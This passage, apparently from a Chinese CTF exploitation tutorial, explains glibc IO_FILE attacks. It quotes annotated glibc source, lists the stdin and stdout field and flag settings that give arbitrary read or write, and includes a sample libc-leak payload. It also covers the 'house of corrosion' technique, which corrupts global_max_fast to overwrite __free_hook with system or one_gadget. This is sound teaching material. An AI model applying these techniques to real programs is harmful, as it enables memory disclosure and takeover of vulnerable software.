</span></span><span class="line"><span class="cl">  <span class="c1">// 调用_IO_SYSREAD函数最终执行系统调用读取数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">count</span> <span class="o">=</span> <span class="nf">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>综上，为了做到<strong>任意写</strong>，满足如下条件，即可进行利用：
(1) 设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>（使得输入缓冲区内没有剩余数据，从而可以从用户读入数据）。
(2) 设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（一般不用特意设置）。
(3) 设置<code>_fileno</code>为<code>0</code>（一般不用特意设置）。
(4) 设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>（我们目标写的起始地址是<code>write_start</code>，写结束地址为<code>write_end</code>），且使得<code>_IO_buf_end-_IO_buf_base</code>大于要写入的数据长度。</p>
<p>2.利用<code>stdout</code>进行<strong>任意读/写</strong></p>
<p><code>printf</code>，<code>fwrite</code>，<code>puts</code>等输出走<code>IO</code>指针（<code>write</code>不走）。
在<code>_IO_2_1_stdout_</code>中，<code>_IO_buf_base</code>和<code>_IO_buf_end</code>为输出缓冲区起始位置（默认大小为<code>0x400</code>），在输出的过程中，会先将需要输出的数据从目标地址拷贝到输出缓冲区，再从输出缓冲区输出给用户。
缓冲区建立函数<code>_IO_doallocbuf</code>会建立输出缓冲区，并把基地址保存在<code>_IO_buf_base</code>中，结束地址保存在<code>_IO_buf_end</code>中。在建立里输出缓冲区后，会将基址址给<code>_IO_write_base</code>，若是设置的是全缓冲模式<code>_IO_FULL_BUF</code>，则会将结束地址给<code>_IO_write_end</code>，若是设置的是行缓冲模式<code>_IO_LINE_BUF</code>，则<code>_IO_write_end</code>中存的是<code>_IO_buf_base</code>，此外，<code>_IO_write_ptr</code>表示输出缓冲区中已经使用到的地址。即<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code>到<code>_IO_write_end</code>之间为剩余的输出缓冲区。
最终实际调用了<code>_IO_2_1_stdout_</code>的<code>vtable</code>中的<code>_xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数，源码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">IO_size_t</span> <span class="nf">_IO_new_file_xsputn</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">_IO_size_t</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_IO_size_t</span> <span class="n">to_do</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">must_flush</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_IO_size_t</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINE_BUF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="c1">//如果是行缓冲模式...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">count</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span> <span class="c1">//判断输出缓冲区还有多少空间
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="n">n</span><span class="p">;</span> <span class="n">p</span> <span class="o">&gt;</span> <span class="n">s</span><span class="p">;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="o">*--</span><span class="n">p</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span> <span class="c1">//最后一个换行符\n为截断符，且需要刷新输出缓冲区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                  <span class="n">count</span> <span class="o">=</span> <span class="n">p</span> <span class="o">-</span> <span class="n">s</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="n">must_flush</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//标志为真：需要刷新输出缓冲区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                  <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">&gt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">)</span> <span class="c1">//判断输出缓冲区还有多少空间（全缓冲模式）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">count</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">to_do</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="n">to_do</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="nf">__mempcpy</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">s</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">to_do</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">+</span> <span class="n">must_flush</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">//此处关键，见下文详细讨论
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">_IO_size_t</span> <span class="n">block_size</span><span class="p">,</span> <span class="n">do_write</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nf">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span> <span class="c1">//调用_IO_OVERFLOW
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="n">to_do</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nl">EOF</span> <span class="p">:</span> <span class="n">n</span> <span class="o">-</span> <span class="n">to_do</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">block_size</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">do_write</span> <span class="o">=</span> <span class="n">to_do</span> <span class="o">-</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">&gt;=</span> <span class="mi">128</span> <span class="o">?</span> <span class="n">to_do</span> <span class="o">%</span> <span class="nl">block_size</span> <span class="p">:</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">do_write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">count</span> <span class="o">=</span> <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">do_write</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">to_do</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;</span> <span class="n">do_write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">to_do</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">to_do</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">to_do</span> <span class="o">-=</span> <span class="nf">_IO_default_xsputn</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">s</span><span class="o">+</span><span class="n">do_write</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">to_do</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_xsputn</span><span class="p">,</span> <span class="n">_IO_file_xsputn</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>（1）<strong>任意写</strong>
可以看到，在行缓冲模式下，判断输出缓冲区还有多少空间，用的是<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>，而在全缓冲模式下，用的是<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>，若是还有空间剩余，则会将要输出的数据复制到输出缓冲区中（此时由<code>_IO_write_ptr</code>控制，向<code>_IO_write_ptr</code>拷贝<code>count</code>长度的数据），因此可通过这一点来实现任意地址写的功能。
<strong>利用方式</strong>：以全缓冲模式为例，只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可。
这里需要注意的是，有宏定义<code>#define _IO_LINE_BUF 0x0200</code>，此处<code>flag &amp; _IO_LINE_BUF</code>为真，则表示<code>flag</code>中包含了<code>_IO_LINE_BUF</code>标识，即开启了行缓冲模式（可用<code>setvbuf(stdout,0,_IOLBF,1024)</code>开启），若要构造<code>flag</code>包含<code>_IO_LINE_BUF</code>标识，则<code>flag |= 0x200</code>即可。
（2）<strong>任意读</strong>
先讨论<code>_IO_new_file_xsputn</code>源代码中<code>if (to_do + must_flush &gt; 0)</code>有哪些情况会执行该分支中的内容：
(a) 首先要明确的是<code>to_do</code>一定是非负数，因此若<code>must_flush</code>为<code>1</code>的时候就会执行该分支中的内容，而再往上看，当需要输出的内容中有<code>\n</code>换行符的时候就会需要刷新输出缓冲区，即将<code>must_flush</code>设为<code>1</code>，故当输出内容中有<code>\n</code>的时候就会执行该分支的内容，如用<code>puts</code>函数输出就一定会执行。
(b) 若<code>to_do</code>大于<code>0</code>，也会执行该分支中的内容，因此，当 输出缓冲区未建立 或者 输出缓冲区没有剩余空间 或者 输出缓冲区剩余的空间不够一次性将目标地址中的数据完全拷贝过来 的时候，也会执行该<code>if</code>分支中的内容。
而该<code>if</code>分支中主要调用了<code>_IO_OVERFLOW()</code>来刷新输出缓冲区，而在此过程中会调用<code>_IO_do_write()</code>输出我们想要的数据。
相关源码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 判断标志位是否包含_IO_NO_WRITES =&gt; _flags需要不包含_IO_NO_WRITES
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 调用_IO_do_write 输出 输出缓冲区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 从_IO_write_base开始，输出(_IO_write_ptr - f-&gt;_IO_write_base)个字节的数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">ch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">_IO_size_t</span> <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">_IO_size_t</span> <span class="n">to_do</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="n">_IO_size_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">_IO_off64_t</span> <span class="n">new_pos</span>
</span></span><span class="line"><span class="cl">    <span class="o">=</span> <span class="nf">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 调用函数输出输出缓冲区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">count</span> <span class="o">=</span> <span class="nf">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>综上，为了做到<strong>任意读</strong>，满足如下条件，即可进行利用：
(1) 设置<code>_flag &amp;~ _IO_NO_WRITES</code>，即<code>_flag &amp;~ 0x8</code>；
(2) 设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>，即<code>_flag | 0x800</code>；
(3) 设置<code>_fileno</code>为<code>1</code>；
(4) 设置<code>_IO_write_base</code>指向想要泄露的地方，<code>_IO_write_ptr</code>指向泄露结束的地址；
(5) 设置<code>_IO_read_end</code>等于<code>_IO_write_base</code> 或 设置<code>_flag &amp; _IO_IS_APPENDING</code>即，<code>_flag | 0x1000</code>。
此外，有一个大前提：需要调用<code>_IO_OVERFLOW()</code>才行，因此需使得需要输出的内容中含有<code>\n</code>换行符 或 设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（输出缓冲区无剩余空间）等。
一般来说，经常利用<code>puts</code>函数加上述<code>stdout</code>任意读的方式泄露<code>libc</code>。
<code>_flag</code>的构造需满足的条件:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">_flags</span> <span class="o">=</span> <span class="mh">0xfbad0000</span> 
</span></span><span class="line"><span class="cl"><span class="n">_flags</span> <span class="o">&amp;</span> <span class="o">=</span> <span class="o">~</span><span class="n">_IO_NO_WRITES</span> <span class="c1">// _flags = 0xfbad0000
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_flags</span> <span class="o">|</span> <span class="o">=</span> <span class="n">_IO_CURRENTLY_PUTTING</span> <span class="c1">// _flags = 0xfbad0800
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_flags</span> <span class="o">|</span> <span class="o">=</span> <span class="n">_IO_IS_APPENDING</span> <span class="c1">// _flags = 0xfbad1800
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>因此，例如在<code>libc-2.27</code>下，构造<code>payload = p64(0xfbad1800) + p64(0)*3 + b'\x58'</code>，泄露出的第一个地址即为<code>_IO_file_jumps</code>的地址。
此外，<code>_flags</code>也可再加一些其他无关紧要的部分，如设置为<code>0xfbad1887</code>，<code>0xfbad1880</code>，<code>0xfbad3887</code>等等。</p>
<h2 id="global_max_fast的相关利用-house-of-corrosion">global_max_fast的相关利用 (house of corrosion)
</h2><p><code>fastbin_ptr</code>在<code>libc-2.23</code>指向<code>main_arena+8</code>的地址，在<code>libc-2.27</code>及以上指向<code>main_arena+0x10</code>的地址，从此地址开始，存放了各大小的<code>fast bin</code>的<code>fd</code>指针，指向各单链表中首个堆块的地址，因此可将<code>global_max_fast</code>改为很大的数，再释放大堆块进入<code>fast bin</code>，那么就可以将<code>main_arena</code>后的某处覆盖成该堆块地址。
因此，我们需要通过目标地址与<code>fast bin</code>数组的偏移计算出所需<code>free</code>的堆块的<code>size</code>，计算方式如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">fastbin_ptr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="err">&#39;</span><span class="n">main_arena</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="o">=</span> <span class="p">(</span><span class="n">target_addr</span> <span class="o">-</span> <span class="n">fastbin_ptr</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="n">index</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x20</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>容易想到，可以通过此方式进行<code>IO_FILE attack</code>：覆写<code>_IO_list_all</code>，使其指向伪造的结构体，或者伪造<code>._chain</code>指向的结构体来实现任意读写，或者伪造<code>vtable</code>（<code>libc-2.23</code>）。
也可以利用此方式，修改<code>__free_hook</code>函数（<code>__malloc_hook</code>与<code>__realloc_hook</code>在<code>main_arena</code>的上方），从而<code>getshell</code>，此时需要有<code>UAF</code>漏洞修改<code>__free_hook</code>中的<code>fake fast bin</code>的<code>fd</code>为<code>system_addr</code>或<code>one_gadget</code>（这里不涉及该<code>fd</code>指针指向的堆块的取出，因此不需要伪造<code>size</code>），然后申请出这个<code>fake fast bin</code>，于是<code>__free_hook</code>这里的“伪链表头”将会指向被移出该单链表的<code>fake fast bin</code>的<code>fd</code>字段中的地址，即使得<code>__free_hook</code>中的内容被修改成了<code>system_addr</code>或<code>one_gadget</code>。
